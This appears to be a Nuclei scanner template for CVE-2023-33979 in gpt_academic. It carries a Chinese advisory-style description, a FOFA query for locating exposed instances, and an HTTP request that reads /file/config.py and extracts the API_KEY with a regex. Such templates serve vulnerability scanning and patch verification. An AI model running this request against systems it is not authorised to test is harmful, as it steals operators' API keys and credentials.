id: CVE-2023-33979

info:
  name: gpt_academic未授权获取KEY
  author: wjlin0
  severity: high
  description: gpt_academic 为 ChatGPT/GLM 提供图形界面。在 gpt_academic 3.37 及之前的版本中发现了一个漏洞。此问题会影响组件配置文件处理程序的某些未知处理。参数文件的操纵导致信息泄露。由于没有配置敏感文件禁止访问，部分工作目录下的敏感信息文件可以通过`/file`路径读取，导致敏感信息泄露。这会影响通过“config.py”、“config_private.py”、“Dockerfile”使用文件配置的用户。补丁可在提交 1dcc2873d2168ad2d3d70afcb453ac1695fbdf02 获得。作为一种解决方法，可以使用环境变量而不是 `config*.py` 文件来配置这个项目，或者使用 docker-compose 安装来配置这个项目。
  reference:
    - https://github.com/binary-husky/gpt_academic/commit/1dcc2873d2168ad2d3d70afcb453ac1695fbdf02
  metadata:
    fofa-query: "ChatGPT 学术优化"
  tags: cve,chatgpt

http:
  - method: GET
    path:
      - "{{BaseURL}}/file/config.py"
    req-condition: true
    redirects: true
    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '# [step 4]>> 以下配置可以优化体验，但大部分场合下并不需要修改'
          - '# 本地LLM模型如ChatGLM的执行方式 CPU/GPU'
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: key
        group: 1
        regex:
          - '\nAPI_KEY = "(.*?)"'
# digest: 4a0a0047304502210098b9795295611493cd0d0a67a7cc8fc716512ccc289f08e486a2c4daee0d96eb0220446b91d3f306f93d78f6f6efe96bf4e662d48368d58aa97b85da8b618dd6a9c4:9d8cf424f0e932381bf27cf1e926b867